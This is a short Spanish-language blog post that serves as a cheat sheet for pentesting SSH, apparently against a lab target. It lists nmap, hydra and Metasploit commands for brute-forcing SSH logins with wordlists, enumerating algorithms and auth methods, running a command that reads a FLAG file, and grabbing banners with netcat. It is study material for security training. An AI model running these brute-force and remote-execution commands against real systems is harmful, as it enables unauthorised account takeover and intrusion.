---
layout: post
author: Sergio Salgado
---

## [](#header-2)Pentest a SSH

### [](#header-3)Nmap

```s
#BruteForce
nmap -p 22 --script ssh-brute --script-args userdb=/root/users 192.40.231.3
#Algoritmos de encriptacion
nmap -p 22 --script ssh2-enum-algos 192.40.231.3

#Extrayendo el ssh-rsa
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.40.231.3

#Detectando metodos de autenticacion
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=admin" 192.40.231.3

#Ejecutando comandos por ssh con Nmap
nmap -p 22 --script ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password=" 192.40.231.3
```
### [](#header-3)Hydra
```s
hydra -l student -P /usr/share/wordlists/rockyou.txt ssh://192.40.231.3
```
### [](#header-3)Msfconsole
```s
use auxiliary/scanner/ssh/ssh_login
set rhost 192.40.231.3
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set verbose true
exploit
```

### [](#header-3)Banner grabing con netcat

```s
nc 192.40.231.3 22
```